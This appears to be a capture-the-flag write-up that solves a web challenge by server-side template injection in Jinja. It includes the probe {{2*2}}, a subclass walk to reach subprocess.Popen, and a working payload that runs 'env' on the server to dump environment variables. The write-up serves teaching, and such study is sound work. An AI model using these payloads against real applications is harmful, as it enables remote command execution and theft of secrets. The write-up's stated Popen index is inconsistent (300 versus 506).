# Announce your name

We can write to the form input if we disable JavaScript from the browser console.

The server simply replies with whatever we introduce (I guess the word "open" was replaced by "REDACTED" but it does not matter).

Looking at the http headers you can see that is a Python server. Testing if it is using Jinja (a python template engine) we introduce a simple payload like `{{2*2}}`.

It returned "4" so is using Jinja and the server is vulnerable to STTI.

```
# Example of malignant expression
>>> ''.__class__
<class 'str'>
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[1].__subclasses__
<built-in method __subclasses__ of type object at 0xa02d80>
>>> import subprocess
>>> for i, cls in enumerate(object.__subclasses__()):
...     if cls.__name__ == "Popen" and cls.__module__ == "subprocess":
...         print(f"index: {i} -> {cls}")
...
index: 300 -> <class 'subprocess.Popen'>
```

With `{{''.__class__.__mro__[1].__subclasses__()}}` you can see the available subclasses.

In this case we are looking for the index of `subprocess.Popen`, that is the last subclass.

With `{{''.__class__.__mro__[1].__subclasses__() | length }}` we found it's index.

With `{{''.__class__.__mro__[1].__subclasses__()[506]("env",shell=True,stdout=-1).communicate()}}` we can see the environment variables, including the flag.

`EnXp{N01T53UQFTC34T3DAM5A47ANUK}`
